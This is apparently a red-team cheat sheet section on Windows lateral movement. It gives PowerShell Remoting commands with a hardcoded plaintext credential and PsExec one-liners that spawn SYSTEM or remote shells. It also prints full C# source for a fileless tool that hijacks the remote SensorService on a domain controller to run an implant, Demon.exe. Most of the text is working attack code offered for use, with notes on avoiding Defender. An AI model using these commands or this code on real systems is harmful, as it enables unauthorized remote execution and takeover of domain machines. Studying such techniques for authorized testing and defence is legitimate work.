## Lateral Movement

Once on a target, it's often useful to pivot internally to other users. Below is a subsection of commands that may be used for this.

### Powershell Remoting

Lovely method if Windows Remote Management is enabled or you are in sufficiently privileged groups as it's built in. Not enabled by default since Server 2012.

```powershell
# Single use as current user
Enter-PsSession -ComputerName dc04.matrix.local

# Create a session object to persist 
$sess = New-PSSession -ComputerName dc04.matrix.local 
Enter-PsSession $sess 

# Use a different account credentials to remote
$x = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force
$x3 = New-Object System.Management.Automation.PSCredential ("matrix\neo",$x)
Enter-PSSession -ComputerName dc04 -Credential $x3

# Run a command over Windows Remote Management
$sess = New-PSSession -ComputerName dc04.matrix.local 
Invoke-Command -ScriptBlock{whoami} -session $sess
```

### PsExec 

PsExec from SysInternals will create a remote service on the target machine that returns a shell and then starts it. This attack requires administrative rights generally, though read/write to ADMIN$ on the target may be sufficient. It's dinged hard by defender.

```powershell
psexec64.exe -i -s cmd.exe # Locally run cmd.exe as SYSTEM user
psexec64.exe -i \\dc04.matrix.local cmd.exe # Start cmd.exe on the target server dc04
```

### Custom PSExec Code


```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace FilelessLateralMovement
{
    class Program
    {

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName,uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType,int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup,string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
        
        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            //change this to be the hostname of the target machine
            string target = "dc04";
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            //Sensor service is present by default, but is not automatically run. We can connect to this and hopefully not disrupt anything on the target.
            string ServiceName = "SensorService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            //Edit the service we started with a desired service to execute
            string payload = "C:\\Windows\\Tasks\\Demon.exe";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            //Start the service
            bResult = StartService(schService, 0, null);
        }
    }
}
```